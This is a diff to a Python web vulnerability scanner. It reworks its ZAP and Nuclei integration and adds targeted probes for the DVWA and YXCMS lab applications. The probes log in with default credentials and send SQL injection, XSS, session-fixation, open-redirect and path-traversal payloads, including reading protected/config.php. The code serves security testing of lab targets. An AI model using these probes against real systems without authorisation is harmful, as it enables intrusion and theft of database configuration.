@@ -10,11 +10,13 @@ from dataclasses import dataclass
 from typing import Any, Dict, Iterable, List, Optional, Tuple
 from urllib.parse import urlparse
 
-from zapv2 import ZAPv2
+import requests
 
 from config.settings import (
     NUCLEI_PATH,
     NUCLEI_TEMPLATES_DIR,
+    NUCLEI_PUBLIC_TEMPLATE_DIRS,
+    NUCLEI_CMS_TEMPLATE_DIRS,
     NUCLEI_TARGETED_TEMPLATES,
     DNSLOG_BASE_URL,
     DNSLOG_COOKIE,
@@ -25,6 +27,9 @@ from config.settings import (
     ZAP_API_KEY,
     ZAP_API_URL,
     ZAP_SCAN_TIMEOUT,
+    YXCMS_ADMIN_USER,
+    YXCMS_ADMIN_PASS,
+    YXCMS_LOGIN_PATH,
 )
 from database.db_operation import add_vulnerability
 from core.dnslog_client import DNSLogClient
@@ -102,6 +107,302 @@ def _extract_domain_from_url(url: str) -> str:
     return parsed.hostname
 
 
+def _site_roots_from_urls(urls: List[str]) -> List[str]:
+    """
+    从 URL 列表推导站点根（兼容小皮子目录部署，如 /dvwa、/yxcms）。
+    """
+    roots: list[str] = []
+    seen: set[str] = set()
+    for u in urls or []:
+        try:
+            p = urlparse(u)
+            if not p.scheme or not p.netloc:
+                continue
+            base = f"{p.scheme}://{p.netloc}"
+            path = (p.path or "").strip("/")
+            # 子目录部署：仅保留首段作为应用根
+            if path:
+                first = path.split("/", 1)[0]
+                if first.lower() in {"dvwa", "yxcms"}:
+                    base = f"{base}/{first}"
+            if base not in seen:
+                seen.add(base)
+                roots.append(base.rstrip("/"))
+        except Exception:  # noqa: BLE001
+            continue
+    return roots
+
+
+def _filter_engine_vulns_for_lab(mode: str, items: List["VulnItem"]) -> List["VulnItem"]:
+    """
+    靶场模式下仅保留“更贴近源码漏洞点”的引擎结果，减少泛化告警噪音。
+    """
+    m = (mode or "").lower()
+    if m not in {"dvwa", "cms"}:
+        return items
+
+    kept: list[VulnItem] = []
+    for v in items or []:
+        name = (v.vuln_name or "").lower()
+        tool = (v.tool or "").lower()
+
+        if m == "dvwa":
+            # DVWA：优先保留自定义模板命中（与源码模块一一对应）
+            if tool == "nuclei" and (v.vuln_name or "").startswith("DVWA -"):
+                kept.append(v)
+                continue
+            # ZAP 仅保留 XSS/SQL 注入类
+            if tool == "zap" and any(k in name for k in ("sql injection", "cross site scripting", "xss")):
+                kept.append(v)
+                continue
+        elif m == "cms":
+            # CMS：保留更直接的高风险漏洞类型，去掉安全头类泛告警
+            if any(
+                k in name
+                for k in (
+                    "sql injection",
+                    "cross site scripting",
+                    "xss",
+                    "path traversal",
+                    "file inclusion",
+                    "command injection",
+                    "remote code execution",
+                    "ssrf",
+                )
+            ):
+                kept.append(v)
+                continue
+            if "yxcms" in name:
+                kept.append(v)
+                continue
+    return kept
+
+
+def _probe_dvwa_source_vulns(urls: List[str]) -> List["VulnItem"]:
+    """
+    基于 DVWA 源码（sqli/xss_r/xss_d）的定向探测。
+    """
+    results: list[VulnItem] = []
+    roots = _site_roots_from_urls(urls)
+    if not roots:
+        return results
+
+    for root in roots[:2]:
+        try:
+            s = requests.Session()
+            r = s.get(f"{root}/login.php", timeout=8)
+            if r.status_code >= 400:
+                continue
+            import re
+
+            m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", r.text or "")
+            tok = m.group(1) if m else ""
+            s.post(
+                f"{root}/login.php",
+                data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok},
+                allow_redirects=True,
+                timeout=8,
+            )
+            sec = s.get(f"{root}/security.php", timeout=8)
+            m2 = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", sec.text or "")
+            tok2 = m2.group(1) if m2 else ""
+            s.post(
+                f"{root}/security.php",
+                data={"security": "low", "seclev_submit": "Submit", "user_token": tok2},
+                allow_redirects=True,
+                timeout=8,
+            )
+
+            # SQLi：源码 low.php 直接拼接 '$id' 进入 SQL
+            sqli_url = f"{root}/vulnerabilities/sqli/?id=1%27&Submit=Submit"
+            rs = s.get(sqli_url, timeout=8)
+            body = rs.text or ""
+            if any(k in body.lower() for k in ("sql syntax", "mysqli_", "warning", "mysql")):
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="DVWA Source-Proven SQL Injection (sqli low)",
+                        risk_level="high",
+                        url=sqli_url,
+                        param="id",
+                        description="命中 sqli/source/low.php 字符串拼接查询特征（源码级验证）。",
+                    )
+                )
+
+            # Reflected XSS：low.php 直接回显 $_GET['name']
+            payload = "<svg/onload=alert(1)>"
+            xssr_url = f"{root}/vulnerabilities/xss_r/?name=%3Csvg%2Fonload%3Dalert(1)%3E"
+            rr = s.get(xssr_url, timeout=8)
+            if payload in (rr.text or ""):
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="DVWA Source-Proven Reflected XSS (xss_r low)",
+                        risk_level="high",
+                        url=xssr_url,
+                        param="name",
+                        description="命中 xss_r/source/low.php 未过滤回显（源码级验证）。",
+                    )
+                )
+
+            # DOM XSS：源码 low.php 无防护，页面标识可确认模块暴露
+            xssd_url = f"{root}/vulnerabilities/xss_d/?default=English"
+            rd = s.get(xssd_url, timeout=8)
+            if "DOM Based Cross Site Script" in (rd.text or ""):
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="DVWA Source-Proven DOM XSS Surface (xss_d low)",
+                        risk_level="medium",
+                        url=xssd_url,
+                        param="default",
+                        description="命中 xss_d/source/low.php（无防护）模块页面特征。",
+                    )
+                )
+        except Exception:  # noqa: BLE001
+            continue
+    return results
+
+
+def _probe_yxcms_source_vulns(urls: List[str]) -> List["VulnItem"]:
+    """
+    基于 YXCMS 源码的定向探测：
+    - admin/commonController.php: GET phpsessid -> session_id()（会话固定风险）
+    - default/extendController.php: inputName 直接拼接输出（反射型 XSS 面）
+    """
+    results: list[VulnItem] = []
+    roots = _site_roots_from_urls(urls)
+    if not roots:
+        return results
+
+    for root in roots[:2]:
+        try:
+            sid = "srcfix1234567890"
+            u = f"{root}/index.php?r=admin/index/login&phpsessid={sid}"
+            r = requests.get(u, timeout=8, allow_redirects=True)
+            set_cookie = "; ".join(r.headers.get_all("Set-Cookie")) if hasattr(r.headers, "get_all") else (
+                r.headers.get("Set-Cookie", "")
+            )
+            if sid in (set_cookie or ""):
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="YXCMS Source-Proven Session Fixation (phpsessid)",
+                        risk_level="medium",
+                        url=u,
+                        param="phpsessid",
+                        description="命中 admin/commonController.php 通过 GET 设置 session_id() 的源码行为。",
+                    )
+                )
+        except Exception:  # noqa: BLE001
+            pass
+
+        try:
+            payload = 'a"><svg/onload=alert(1)>'
+            enc = "a%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
+            u2 = f"{root}/index.php?r=default/extend/file&inputName={enc}"
+            r2 = requests.get(u2, timeout=8, allow_redirects=True)
+            body = r2.text or ""
+            if payload in body or "inputName" in body and "form1" in body:
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="YXCMS Source-Proven Reflected XSS Surface (extend/file)",
+                        risk_level="medium",
+                        url=u2,
+                        param="inputName",
+                        description="命中 default/extendController.php 对 inputName 直接输出的源码路径。",
+                    )
+                )
+        except Exception:  # noqa: BLE001
+            pass
+
+        # 会员退出 open redirect
+        # 源码位置：protected/apps/member/controller/indexController.php::logout()
+        try:
+            evil = "http://example.com"
+            u3 = f"{root}/index.php?r=member/index/logout&url={requests.utils.quote(evil, safe='')}"
+            r3 = requests.get(u3, timeout=8, allow_redirects=False)
+            loc = r3.headers.get("Location", "") or r3.headers.get("location", "") or ""
+            body = (r3.text or "")[:2000]
+            if evil in loc or evil in body:
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="YXCMS Source-Proven Open Redirect (member logout url)",
+                        risk_level="medium",
+                        url=u3,
+                        param="url",
+                        description="命中 member/indexController.php::logout() 直接使用 $_GET['url'] 跳转（源码级证据）。",
+                    )
+                )
+        except Exception:  # noqa: BLE001
+            pass
+
+        # 会员中心 iframe src 可控（act 参数直传）
+        # 源码位置：protected/apps/member/controller/indexController.php::index()
+        # 视图位置：protected/apps/member/view/index_index.php (src="{$act}")
+        try:
+            payload = "javascript:alert(1)"
+            u4 = f"{root}/index.php?r=member/index/index&act={requests.utils.quote(payload, safe='')}"
+            r4 = requests.get(u4, timeout=8, allow_redirects=True)
+            body4 = r4.text or ""
+            if payload in body4 and "iframe" in body4.lower():
+                results.append(
+                    VulnItem(
+                        tool="source-probe",
+                        vuln_name="YXCMS Source-Proven Iframe Src Injection Surface (member index act)",
+                        risk_level="medium",
+                        url=u4,
+                        param="act",
+                        description="命中 member/indexController.php::index() 将 $_GET['act'] 直接传入 iframe src（源码级证据）。",
+                    )
+                )
+        except Exception:  # noqa: BLE001
+            pass
+
+        # 后台模板管理：tpgetcode 任意文件读取（路径拼接无穿越拦截）
+        # 源码位置：protected/apps/admin/controller/setController.php::tpgetcode()
+        try:
+            s = requests.Session()
+            login_url = f"{root}{YXCMS_LOGIN_PATH}"
+            _ = s.post(
+                login_url,
+                data={"username": YXCMS_ADMIN_USER, "password": YXCMS_ADMIN_PASS},
+                allow_redirects=True,
+                timeout=10,
+            )
+
+            tpget_url = f"{root}/index.php?r=admin/set/tpgetcode"
+            # 目标文件：protected/config.php（含 allowType/DB 配置等关键字）
+            candidates = [
+                ("default", "../../../../protected/config.php"),
+                ("default", "../../../protected/config.php"),
+                ("default", "../../protected/config.php"),
+            ]
+            for mname, fname in candidates:
+                rr = s.post(tpget_url, data={"Mname": mname, "fname": fname}, timeout=10)
+                body = rr.text or ""
+                if any(k in body for k in ("allowType", "DB_HOST", "DB_NAME", "DB_USER", "DB_PREFIX")):
+                    results.append(
+                        VulnItem(
+                            tool="source-probe",
+                            vuln_name="YXCMS Source-Proven Arbitrary File Read (admin set/tpgetcode path traversal)",
+                            risk_level="high",
+                            url=tpget_url,
+                            param="Mname,fname",
+                            description=(
+                                "命中 setController::tpgetcode() 文件路径拼接读取："
+                                f"Mname={mname} fname={fname}，响应包含配置关键字（源码级证据）。"
+                            ),
+                        )
+                    )
+                    break
+        except Exception:  # noqa: BLE001
+            pass
+    return results
+
+
 @dataclass
 class VulnItem:
     """
@@ -129,6 +430,7 @@ class ZapScanner:
         api_key: str = "",
         timeout: int = 600,
         delay_in_ms: int = 1000,
+        scan_profile: str = "auto",
     ) -> None:
         """
         :param api_url: ZAP API 地址（默认本机 8080）
@@ -137,12 +439,23 @@ class ZapScanner:
         :param delay_in_ms: ZAP 请求延迟（毫秒），用于公网适配
         """
         self.timeout = timeout
-        # zapv2 通过 "proxies" 指向 ZAP API 入口（不是上游代理）
-        proxies = {"http": api_url, "https": api_url}
-        self.zap = ZAPv2(apikey=api_key, proxies=proxies)
         self.api_url = api_url
         self.delay_in_ms = delay_in_ms
         self.api_key = api_key
+        self.scan_profile = (scan_profile or "auto").strip().lower()
+        self.session = requests.Session()
+
+    def _zap_call(self, path: str, params: Optional[Dict[str, Any]] = None, timeout: int = 10) -> Dict[str, Any]:
+        """
+        直接调用 ZAP JSON API，规避 zapv2 代理模式在本机环境下不稳定的问题。
+        """
+        url = f"{self.api_url.rstrip('/')}/JSON/{path.lstrip('/')}"
+        q: Dict[str, Any] = {"apikey": self.api_key}
+        if params:
+            q.update(params)
+        resp = self.session.get(url, params=q, timeout=timeout)
+        resp.raise_for_status()
+        return resp.json()
 
     def _dvwa_prepare_session_cookie(self, base_url: str) -> Tuple[bool, str]:
         """
@@ -159,7 +472,7 @@ class ZapScanner:
                 return False, "DVWA login.php 访问失败"
 
             # dvwa 的 CSRF token
-            m = re.search(r"name=['\"]user_token['\"]\\s+value=['\"]([^'\"]+)['\"]", r.text or "")
+            m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", r.text or "")
             token = m.group(1) if m else ""
 
             resp = s.post(
@@ -178,7 +491,7 @@ class ZapScanner:
 
             # 设置 security=low（需要新 token）
             sec = s.get(f"{base_url}/security.php", timeout=10)
-            m2 = re.search(r"name=['\"]user_token['\"]\\s+value=['\"]([^'\"]+)['\"]", sec.text or "")
+            m2 = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", sec.text or "")
             token2 = m2.group(1) if m2 else ""
             _ = s.post(
                 f"{base_url}/security.php",
@@ -196,27 +509,50 @@ class ZapScanner:
             logger.warning("DVWA 会话准备失败: %s", exc)
             return False, "DVWA 会话准备失败"
 
+    def _yxcms_prepare_session_cookie(self, base_url: str) -> Tuple[bool, str]:
+        """
+        YXCMS 专用：登录后台获取会话 Cookie，用于 ZAP 携带认证态扫描。
+        """
+        try:
+            import requests
+
+            s = requests.Session()
+            login_url = f"{base_url}{YXCMS_LOGIN_PATH}"
+            # 常见后台登录表单字段：username/password
+            resp = s.post(
+                login_url,
+                data={"username": YXCMS_ADMIN_USER, "password": YXCMS_ADMIN_PASS},
+                allow_redirects=True,
+                timeout=10,
+            )
+            if resp.status_code >= 400:
+                return False, "YXCMS 登录失败（HTTP 错误）"
+
+            ck = s.cookies.get_dict()
+            if not ck:
+                return False, "YXCMS 未获得会话 Cookie"
+            cookie_header = "; ".join([f"{k}={v}" for k, v in ck.items()])
+            return True, cookie_header
+        except Exception as exc:  # noqa: BLE001
+            logger.warning("YXCMS 会话准备失败: %s", exc)
+            return False, "YXCMS 会话准备失败"
+
     def _zap_set_cookie_replacer(self, cookie_header: str) -> None:
         """
         给 ZAP 加一条 replacer 规则，强制携带 Cookie（用于已登录会话）。
         """
         try:
-            # 先尽量删除同名规则，避免重复叠加
-            try:
-                rules = self.zap.replacer.rules
-                for r in rules or []:
-                    if str(r.get("description") or "") == "dvwa-cookie":
-                        self.zap.replacer.remove_rule(r.get("id"))
-            except Exception:  # noqa: BLE001
-                pass
-
-            self.zap.replacer.add_rule(
-                description="dvwa-cookie",
-                enabled="true",
-                matchtype="REQ_HEADER",
-                matchregex="false",
-                matchstring="Cookie",
-                replacement=cookie_header,
+            _ = self._zap_call(
+                "replacer/action/addRule/",
+                {
+                    "description": "dvwa-cookie",
+                    "enabled": "true",
+                    "matchType": "REQ_HEADER",
+                    "matchRegex": "false",
+                    "matchString": "Cookie",
+                    "replacement": cookie_header,
+                },
+                timeout=10,
             )
         except Exception as exc:  # noqa: BLE001
             logger.warning("ZAP 设置 Cookie replacer 失败（将继续执行）: %s", exc)
@@ -226,7 +562,8 @@ class ZapScanner:
         检查 ZAP 服务是否可用。
         """
         try:
-            _ = self.zap.core.version
+            data = self._zap_call("core/view/version/", timeout=8)
+            _ = data.get("version", "")
             return True, "ZAP 服务可用"
         except Exception as exc:  # noqa: BLE001
             logger.exception("ZAP 服务不可用: %s", exc)
@@ -253,67 +590,131 @@ class ZapScanner:
         logger.info("ZAP 扫描开始: urls=%s ua=%s delay_ms=%s", len(urls), ua, self.delay_in_ms)
 
         try:
-            # 设置 User-Agent 与延迟（部分选项可能因 ZAP 版本不同而失败，因此容错）
+            # 设置延迟（部分 API 版本可能不支持，因此容错）
             try:
-                self.zap.core.set_option_default_user_agent(ua)
-            except Exception:  # noqa: BLE001
-                logger.warning("ZAP 设置默认 User-Agent 失败，继续执行")
-            try:
-                self.zap.ascan.set_option_delay_in_ms(str(self.delay_in_ms))
+                _ = self._zap_call("ascan/action/setOptionDelayInMs/", {"Integer": str(self.delay_in_ms)}, timeout=8)
             except Exception:  # noqa: BLE001
                 logger.warning("ZAP 设置 delayInMs 失败，继续执行")
 
-            # DVWA：若目标站点包含 /login.php 且可访问，则自动登录并强制带 Cookie，提高覆盖率
+            # DVWA/YXCMS：尽量准备认证 Cookie，提高后台覆盖率
             try:
                 base = urls[0].split("?", 1)[0].rstrip("/")
                 parsed = urlparse(base)
                 base_url = f"{parsed.scheme}://{parsed.netloc}"
-                ok_ck, cookie_header = self._dvwa_prepare_session_cookie(base_url)
-                if ok_ck and cookie_header:
-                    self._zap_set_cookie_replacer(cookie_header)
-                    logger.info("DVWA 会话已准备，ZAP 将携带 Cookie 扫描: %s", base_url)
+                if self.scan_profile == "dvwa":
+                    ok_ck, cookie_header = self._dvwa_prepare_session_cookie(base_url)
+                    if ok_ck and cookie_header:
+                        self._zap_set_cookie_replacer(cookie_header)
+                        logger.info("DVWA 会话已准备，ZAP 将携带 Cookie 扫描: %s", base_url)
+                elif self.scan_profile == "cms":
+                    ok_ck, cookie_header = self._yxcms_prepare_session_cookie(base_url)
+                    if ok_ck and cookie_header:
+                        self._zap_set_cookie_replacer(cookie_header)
+                        logger.info("YXCMS 会话已准备，ZAP 将携带 Cookie 扫描: %s", base_url)
             except Exception:  # noqa: BLE001
                 pass
 
             # 先 spider / ajax spider（覆盖更多路径），再 active scan
             seed = urls[0]
-            try:
-                spider_id = self.zap.spider.scan(seed)
-                while True:
-                    status = int(self.zap.spider.status(spider_id))
-                    if status >= 100:
-                        break
-                    time.sleep(2)
-                    if time.time() - started > self.timeout:
-                        raise TimeoutError("ZAP spider 超时")
-            except Exception as exc:  # noqa: BLE001
-                logger.warning("ZAP spider 失败（将继续）：%s", exc)
+            # CMS 场景下 spider 的种子如果选到深层路径，会导致爬取范围失控；
+            # 这里强制改为站点根地址，显著缩短 scanning 阶段。
+            if self.scan_profile == "cms":
+                p_seed = urlparse(seed)
+                if p_seed.scheme and p_seed.netloc:
+                    seed = f"{p_seed.scheme}://{p_seed.netloc}"
 
-            try:
-                _ = self.zap.ajaxSpider.scan(seed)
-                # ajaxSpider 没有百分比状态，用固定时间窗口轮询
-                deadline = time.time() + min(120, max(20, int(self.timeout / 5)))
-                while time.time() < deadline:
-                    status = str(self.zap.ajaxSpider.status).lower()
-                    if status in {"stopped", "complete"}:
-                        break
-                    time.sleep(2)
-            except Exception as exc:  # noqa: BLE001
-                logger.warning("ZAP ajax spider 失败（将继续）：%s", exc)
+            # DVWA 场景：为保证“尽快出报告”，跳过 spider/ajaxSpider，
+            # 只对少量关键入口做主动扫描（xss_d/sqli 等）。
+            skip_spider = self.scan_profile == "dvwa"
+            if not skip_spider:
+                try:
+                    spider_id = str(self._zap_call("spider/action/scan/", {"url": seed}, timeout=15).get("scan", "0"))
+                    while True:
+                        status = int(
+                            self._zap_call("spider/view/status/", {"scanId": spider_id}, timeout=8).get("status", "0")
+                        )
+                        if status >= 100:
+                            break
+                        time.sleep(2)
+                        if time.time() - started > self.timeout:
+                            raise TimeoutError("ZAP spider 超时")
+                except Exception as exc:  # noqa: BLE001
+                    logger.warning("ZAP spider 失败（将继续）：%s", exc)
+
+                try:
+                    _ = self._zap_call("ajaxSpider/action/scan/", {"url": seed}, timeout=12)
+                    # ajaxSpider 没有百分比状态，用固定时间窗口轮询
+                    deadline = time.time() + min(120, max(20, int(self.timeout / 5)))
+                    while time.time() < deadline:
+                        status = str(self._zap_call("ajaxSpider/view/status/", timeout=8).get("status", "")).lower()
+                        if status in {"stopped", "complete"}:
+                            break
+                        time.sleep(2)
+                except Exception as exc:  # noqa: BLE001
+                    logger.warning("ZAP ajax spider 失败（将继续）：%s", exc)
 
             # 逐个 URL 做访问与主动扫描（避免一次性对公网压力过大）
-            for url in urls:
+            # CMS 场景下 urls 可能很多；但 spider/ajaxSpider 已能覆盖大量路径，
+            # 因此主动扫描只挑“后台入口/登录相关”的少量目标，显著缩短扫描时长。
+            scan_targets = urls
+            if self.scan_profile == "cms":
+                scan_targets = []
+                seen: set[str] = set()
+                for u in urls:
+                    lu = (u or "").lower()
+                    if not lu or lu in seen:
+                        continue
+                    if any(
+                        k in lu
+                        for k in (
+                            "/index.php?r=admin",
+                            "/index.php?r=admin/login",
+                            "/admin",
+                            "/login.php",
+                            "/index.php",
+                        )
+                    ):
+                        scan_targets.append(u)
+                        seen.add(lu)
+                    if len(scan_targets) >= 6:
+                        break
+                if not scan_targets:
+                    scan_targets = urls[:2]
+            elif self.scan_profile == "dvwa":
+                scan_targets = []
+                seen = set()
+                dvwa_keys = (
+                    "/vulnerabilities/xss_d",
+                    "/vulnerabilities/sqli",
+                    "/vulnerabilities/sql",
+                    "/vulnerabilities/xss",
+                    "/vulnerabilities/",
+                    "/index.php",
+                )
+                for u in urls:
+                    lu = (u or "").lower()
+                    if not lu or lu in seen:
+                        continue
+                    if any(k in lu for k in dvwa_keys):
+                        scan_targets.append(u)
+                        seen.add(lu)
+                    if len(scan_targets) >= 6:
+                        break
+                if not scan_targets:
+                    scan_targets = urls[:2]
+
+            for url in scan_targets:
                 time.sleep(max(0.0, float(REQUEST_DELAY)))
                 try:
-                    self.zap.core.access_url(url)
+                    _ = self._zap_call("core/action/accessUrl/", {"url": url, "followRedirects": "true"}, timeout=12)
                 except Exception:  # noqa: BLE001
                     logger.debug("ZAP access_url 失败（可能被 WAF/网络波动）：%s", url)
 
                 try:
-                    scan_id = self.zap.ascan.scan(url)
+                    scan_id = str(self._zap_call("ascan/action/scan/", {"url": url}, timeout=15).get("scan", "0"))
                     # 等待扫描完成
                     while True:
-                        status = int(self.zap.ascan.status(scan_id))
+                        status = int(self._zap_call("ascan/view/status/", {"scanId": scan_id}, timeout=8).get("status", "0"))
                         if status >= 100:
                             break
                         time.sleep(2)
@@ -326,8 +727,15 @@ class ZapScanner:
                 except Exception as exc:  # noqa: BLE001
                     logger.warning("ZAP active scan 失败: url=%s err=%s", url, exc)
 
-            # 汇总 alerts
-            alerts = self.zap.core.alerts()
+            # 汇总 alerts：不依赖 scheme/baseurl 精确匹配，按 host 过滤，避免 http/https 混用导致 0 结果。
+            seed_host = (urlparse(seed).netloc or "").lower()
+            all_alerts = self._zap_call("core/view/alerts/", {"start": "0", "count": "9999"}, timeout=20).get("alerts", [])
+            alerts = []
+            for a in all_alerts:
+                u = str(a.get("url") or "")
+                h = (urlparse(u).netloc or "").lower()
+                if not seed_host or h == seed_host:
+                    alerts.append(a)
             results: list[VulnItem] = []
             for alert in alerts:
                 try:
@@ -387,6 +795,12 @@ class NucleiScanner:
         self.nuclei_vars = nuclei_vars or {}
         self.scan_profile = (scan_profile or "auto").strip().lower()
 
+        # 公网目标允许更长时间；cms 本地靶场优先快速出结果，避免长时间卡在 nuclei。
+        if self.scan_profile == "public":
+            self.timeout = max(self.timeout, 1200)
+        elif self.scan_profile == "cms":
+            self.timeout = min(max(self.timeout, 120), 300)
+
     def scan_urls(self, urls: List[str]) -> Tuple[bool, List[VulnItem], str]:
         """
         执行 nuclei 扫描并解析 JSONL 输出。
@@ -416,7 +830,7 @@ class NucleiScanner:
 
         # 若配置了定向模板，则优先使用（用于 CVE 定向快速验证，避免泛扫耗时）
         # 公网目标时剔除 DVWA 专用模板，避免无意义匹配拖慢流程。
-        targeted = []
+        targeted: List[str] = []
         for p in (NUCLEI_TARGETED_TEMPLATES or []):
             if not p or not isinstance(p, str):
                 continue
@@ -447,9 +861,21 @@ class NucleiScanner:
             if dvwa_templates:
                 for p in dvwa_templates:
                     cmd.extend(["-t", p])
-        elif targeted:
-            for p in targeted:
-                cmd.extend(["-t", p])
+        else:
+            # public/cms：加载通用模板目录（否则只靠少数定向 CVE 命中率极低）
+            if self.scan_profile == "public":
+                dirs = NUCLEI_PUBLIC_TEMPLATE_DIRS
+            elif self.scan_profile == "cms":
+                dirs = NUCLEI_CMS_TEMPLATE_DIRS
+            else:
+                dirs = []
+            for d in dirs:
+                if d and os.path.isdir(d):
+                    cmd.extend(["-t", d])
+            # 同时加载定向模板（补充 CVE 快速验证）
+            if targeted:
+                for p in targeted:
+                    cmd.extend(["-t", p])
 
         # 传入模板变量（用于 dnslog_tag/dnslog_domain 等）
         for k, v in list(self.nuclei_vars.items())[:20]:
@@ -597,27 +1023,69 @@ def scan_urls(
         api_key=ZAP_API_KEY,
         timeout=int(ZAP_SCAN_TIMEOUT),
         delay_in_ms=int(max(0.0, float(REQUEST_DELAY)) * 1000),
+        scan_profile=mode,
     )
 
-    summary: Dict[str, Any] = {"nuclei": 0, "zap": 0, "total": 0}
+    summary: Dict[str, Any] = {"nuclei": 0, "zap": 0, "source": 0, "total": 0}
     errors: list[str] = []
 
-    # nuclei 扫描
-    ok_n, nuclei_vulns, msg_n = nuclei_scanner.scan_urls(urls)
-    if ok_n:
-        summary["nuclei"] = len(nuclei_vulns)
-        for v in nuclei_vulns:
-            add_vulnerability(
-                task_id=task_id,
-                tool=v.tool,
-                vuln_name=v.vuln_name,
-                risk_level=v.risk_level,
-                url=v.url,
-                param=v.param,
-                description=v.description,
-            )
+    # cms 模式：先跑 ZAP，快速拿到可验证结果，避免 nuclei 阻塞整条链路。
+    zap_ran = False
+    if mode == "cms":
+        ok_z, zap_vulns, msg_z = zap_scanner.scan_urls(urls)
+        if ok_z:
+            zap_ran = True
+            zap_vulns = _filter_engine_vulns_for_lab(mode, zap_vulns)
+            summary["zap"] = len(zap_vulns)
+            for v in zap_vulns:
+                add_vulnerability(
+                    task_id=task_id,
+                    tool=v.tool,
+                    vuln_name=v.vuln_name,
+                    risk_level=v.risk_level,
+                    url=v.url,
+                    param=v.param,
+                    description=v.description,
+                )
+        else:
+            errors.append(msg_z)
+
+        # 只有在 ZAP 没出结果时才补跑 nuclei，控制总时长。
+        if summary["zap"] == 0:
+            ok_n, nuclei_vulns, msg_n = nuclei_scanner.scan_urls(urls)
+            if ok_n:
+                nuclei_vulns = _filter_engine_vulns_for_lab(mode, nuclei_vulns)
+                summary["nuclei"] = len(nuclei_vulns)
+                for v in nuclei_vulns:
+                    add_vulnerability(
+                        task_id=task_id,
+                        tool=v.tool,
+                        vuln_name=v.vuln_name,
+                        risk_level=v.risk_level,
+                        url=v.url,
+                        param=v.param,
+                        description=v.description,
+                    )
+            else:
+                errors.append(msg_n)
     else:
-        errors.append(msg_n)
+        # nuclei 扫描
+        ok_n, nuclei_vulns, msg_n = nuclei_scanner.scan_urls(urls)
+        if ok_n:
+            nuclei_vulns = _filter_engine_vulns_for_lab(mode, nuclei_vulns)
+            summary["nuclei"] = len(nuclei_vulns)
+            for v in nuclei_vulns:
+                add_vulnerability(
+                    task_id=task_id,
+                    tool=v.tool,
+                    vuln_name=v.vuln_name,
+                    risk_level=v.risk_level,
+                    url=v.url,
+                    param=v.param,
+                    description=v.description,
+                )
+        else:
+            errors.append(msg_n)
 
     # Log4j（CVE-2021-44228）dnslog 二次确认：如果提供了 dnslog_tag/domain 则查询记录
     try:
@@ -644,21 +1112,20 @@ def scan_urls(
     except Exception as exc:  # noqa: BLE001
         logger.warning("DNSLog 二次确认异常（忽略不影响任务完成）: %s", exc)
 
-    # ZAP 扫描：dvwa 模式直接跳过；public/auto 根据 URL 判断是否跳过本机回环目标
+    # ZAP 扫描：
+    # - dvwa 模式不再跳过：部分交互/DOM 型漏洞仅 ZAP 能产出证据
+    # - cms 模式已在上面执行（避免重复跑）
     skip_zap = False
     try:
-        if mode == "dvwa":
+        if mode == "cms" and zap_ran:
             skip_zap = True
-        else:
-            sample = urls[:10] if urls else []
-            if any(isinstance(u, str) and (":7777" in u or "127.0.0.1" in u or "localhost" in u) for u in sample):
-                skip_zap = True
     except Exception:  # noqa: BLE001
         skip_zap = False
 
     if not skip_zap:
         ok_z, zap_vulns, msg_z = zap_scanner.scan_urls(urls)
         if ok_z:
+            zap_vulns = _filter_engine_vulns_for_lab(mode, zap_vulns)
             summary["zap"] = len(zap_vulns)
             for v in zap_vulns:
                 add_vulnerability(
@@ -673,9 +1140,32 @@ def scan_urls(
         else:
             errors.append(msg_z)
     else:
-        logger.info("本地 DVWA 跳过 ZAP 扫描: task_id=%s", task_id)
+        logger.info("跳过 ZAP 扫描: task_id=%s", task_id)
 
-    summary["total"] = int(summary["nuclei"]) + int(summary["zap"])
+    # 源码对齐探测：补充真实漏洞证据（避免仅依赖模板/规则）
+    source_vulns: list[VulnItem] = []
+    try:
+        if mode == "dvwa":
+            source_vulns = _probe_dvwa_source_vulns(urls)
+        elif mode == "cms":
+            source_vulns = _probe_yxcms_source_vulns(urls)
+    except Exception as exc:  # noqa: BLE001
+        logger.warning("源码对齐探测异常（已忽略）: %s", exc)
+
+    if source_vulns:
+        summary["source"] = len(source_vulns)
+        for v in source_vulns:
+            add_vulnerability(
+                task_id=task_id,
+                tool=v.tool,
+                vuln_name=v.vuln_name,
+                risk_level=v.risk_level,
+                url=v.url,
+                param=v.param,
+                description=v.description,
+            )
+
+    summary["total"] = int(summary["nuclei"]) + int(summary["zap"]) + int(summary.get("source", 0))
 
     elapsed = time.time() - started
     logger.info(
